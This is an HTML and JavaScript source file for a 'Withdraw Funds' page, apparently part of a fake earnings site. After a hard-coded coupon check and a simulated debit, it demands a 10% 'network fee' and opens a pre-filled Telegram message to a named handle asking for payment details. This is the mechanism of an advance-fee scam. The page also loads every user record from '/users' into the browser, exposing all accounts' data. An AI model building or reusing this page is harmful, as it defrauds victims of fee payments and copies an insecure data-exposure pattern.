<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Withdraw</title>

<style>
  :root { --blue:#007bff; --yellow:#ffcc00; }
  body{
    margin:0;font-family:Arial,Helvetica,sans-serif;color:#333;
    background:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvtdFyqzfN9BCsj-zmH7y_aNumJTa9uPcx4ESJJttliwsc0PCV5SQldWjA&s=10')
              no-repeat center/cover fixed;
  }
  h2{text-align:center;font-size:2.4rem;color:var(--yellow);margin:1rem 0}
  .wrap{
    max-width:620px;margin:3rem auto;padding:2rem 2.5rem;
    background:rgba(255,255,255,.85);border-radius:12px;
    box-shadow:0 8px 18px rgba(0,0,0,.25);
  }
  label{display:block;margin-top:1rem;font-weight:600}
  input,select,button{
    width:100%;padding:.8rem;font-size:1rem;margin-top:.4rem;
    border:1px solid #ccc;border-radius:6px;
  }
  input[readonly]{background:#f1f1f1}
  button{
    background:var(--blue);color:#fff;border:none;cursor:pointer;
    transition:.25s background;
  } button:hover{background:#0056b3}
  .msg{margin-top:.75rem;text-align:center;font-weight:600}
  .hidden{display:none}
</style>
</head>
<body>
<div class="wrap">
  <h2>Withdraw Funds</h2>

  <p style="text-align:center">
    Current Balance: <strong id="bal">—</strong> USD
  </p>

  <form id="form">
    <label for="amountEur">Amount to withdraw (€):</label>
    <input type="number" id="amountEur" min="1" step="0.01" required />

    <label for="amountUsd">Equivalent in USD:</label>
    <input id="amountUsd" readonly />

    <label for="method">Payment method:</label>
    <select id="method" required>
      <option value="">— Select —</option>
      <option>PayPal</option><option>Zelle</option><option>Cash App</option>
      <option>Bitcoin</option><option>USDT</option><option>Chime</option>
      <option>Apple Pay</option><option>Venmo</option><option>Wise</option>
      <option>Revolut</option><option>Google Pay</option><option>MetaMask</option>
      <option>Skrill</option><option>Neteller</option><option>Bank Transfer</option>
      <option>MoneyGram</option><option>Payeer</option><option>Perfect Money</option>
      <option>Alipay</option>
    </select>

    <div id="detailWrap"></div>

    <!-- coupon asks later -->
    <div id="couponWrap" class="hidden">
      <label for="coupon">Withdrawal coupon:</label>
      <input id="coupon" placeholder="Enter coupon DLX338989"/>
    </div>

    <button type="submit" id="submitBtn">Send & Confirm</button>
    <div class="msg" id="msg"></div>
  </form>

  <!-- approval section appears after debit -->
  <div id="feeSection" class="hidden" style="margin-top:2rem;text-align:center">
    <p>You must pay a <strong>10 % network fee</strong> to finalise this withdrawal.</p>
    <button id="approveBtn">Approve & Open Telegram</button>
  </div>

  <p style="text-align:center;margin-top:2rem">
    <a href="/dashboard.html">← Back to Dashboard</a>
  </p>
</div>

<script>
const balEl = document.getElementById('bal');
const amountEur = document.getElementById('amountEur');
const amountUsd = document.getElementById('amountUsd');
const method = document.getElementById('method');
const detailWrap = document.getElementById('detailWrap');
const couponWrap = document.getElementById('couponWrap');
const couponEl = document.getElementById('coupon');
const form = document.getElementById('form');
const msg = document.getElementById('msg');
const feeSec = document.getElementById('feeSection');
const approveBtn = document.getElementById('approveBtn');

let userBalance = 0;
let currentEmail = sessionStorage.email || '';   // set after login

// -------- get logged-in user balance ----------
(async function fetchBalance(){
  try{
    const res = await fetch('/users');            // returns the whole array
    if(!res.ok) throw new Error('fetch error');
    const users = await res.json();
    const me = users.find(u => u.email === currentEmail);
    if(!me) throw new Error('User not found');
    userBalance = Number(me.balance)||0;
    balEl.textContent = userBalance.toLocaleString();
  }catch(e){
    balEl.textContent='(error)';
    msg.textContent='Could not load balance.';
  }
})();

// -------- euro → usd live convert -------------
amountEur.addEventListener('input', async ()=>{
  const val = parseFloat(amountEur.value);
  if(!val){ amountUsd.value=''; return; }
  try{
    const r = await fetch('https://api.exchangerate-api.com/v4/latest/EUR');
    const rate = (await r.json()).rates.USD;
    amountUsd.value = (val*rate).toFixed(2);
  }catch{ amountUsd.value='rate err'; }
});

// -------- change payment fields ---------------
method.addEventListener('change', ()=>{
  const t = method.value;
  if(!t){ detailWrap.innerHTML=''; return; }
  let ph = 'Payment detail';
  if(['PayPal','Zelle'].includes(t)) ph='Email address';
  else if(['Bitcoin','USDT','MetaMask'].includes(t)) ph='Wallet address';
  else if(t==='Cash App') ph='Cashtag e.g. $example';
  else if(['Apple Pay','Google Pay','Venmo'].includes(t)) ph='Mobile number';
  else if(t==='Bank Transfer') ph='IBAN / Account number';

  detailWrap.innerHTML=`
    <label for="detail">${t} details:</label>
    <input id="detail" required placeholder="${ph}">
  `;
});

// -------- form submit -------------------------
form.addEventListener('submit', async e=>{
  e.preventDefault();
  msg.textContent='';
  const usd = parseFloat(amountUsd.value);
  if(!usd){ msg.textContent='Invalid amount.'; return; }

  // balance check
  if(usd>userBalance){
    msg.textContent='Insufficient balance.';
    return;
  }

  // if coupon not shown yet, reveal it and stop
  if(couponWrap.classList.contains('hidden')){
    couponWrap.classList.remove('hidden');
    msg.textContent='Enter your withdrawal coupon to proceed.';
    return;
  }

  // validate coupon
  if(couponEl.value.trim()!=='DLX338989'){
    msg.textContent='Invalid coupon. Contact support.';
    return;
  }

  // all good – debit via API
  try{
    const body = {
      email: currentEmail,
      amountUsd: usd,
      amountEur: parseFloat(amountEur.value),
      method: method.value,
      detail: document.getElementById('detail')?.value||''
    };
    const r = await fetch('/users/withdraw',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(body)
    });
    if(!r.ok) throw new Error('Withdraw failed');
    userBalance -= usd;
    balEl.textContent=userBalance.toLocaleString();
    form.classList.add('hidden');
    feeSec.classList.remove('hidden');
  }catch(err){
    msg.textContent='Server error: '+err.message;
  }
});

// -------- approve button (telegram deep link) --
approveBtn.addEventListener('click', ()=>{
  const txt = encodeURIComponent(
    `Hello @deluxcashearnig! I just withdrew $${amountUsd.value}.\n`+
    `Method: ${method.value}\nDetails: ${document.getElementById('detail')?.value}\n`+
    `Fee (10 %): $${(amountUsd.value*0.1).toFixed(2)}\n`+
    `Please send payment details so I can pay the fee and approve my transaction.`
  );
  window.open(`https://t.me/share/url?url=&text=${txt}`,'_blank');
});
</script>
</body>
</html>